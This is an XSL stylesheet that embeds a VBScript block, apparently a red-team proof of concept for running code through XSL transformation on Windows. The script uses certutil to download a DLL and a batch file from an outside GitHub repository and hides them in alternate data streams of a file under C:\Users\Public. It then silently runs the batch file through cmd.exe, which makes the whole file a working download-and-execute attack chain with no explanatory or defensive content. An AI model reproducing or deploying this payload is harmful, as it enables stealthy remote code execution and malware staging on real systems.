<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
  <ms:script implements-prefix="user" language="VBScript">
  <![CDATA[
  Set oShell = WScript.CreateObject ("WScript.Shell")
  oShell.run "certutil -urlcache -split -f https://github.com/RT-KT/PoC/raw/master/hw64.dll C:\Users\Public\sysinfo.inf:dwn.dll", 0
  oShell.run "certutil -urlcache -split -f https://raw.githubusercontent.com/RT-KT/PoC/master/inject-from-ads.bat C:\Users\Public\sysinfo.inf:injexp.bat", 0
  oShell.Run "cmd.exe /c ""cmd.exe /v /q < C:\Users\Public\sysinfo.inf:injexp.bat""", 0
  Set oShell = Nothing'
  ]]></ms:script>
</stylesheet>
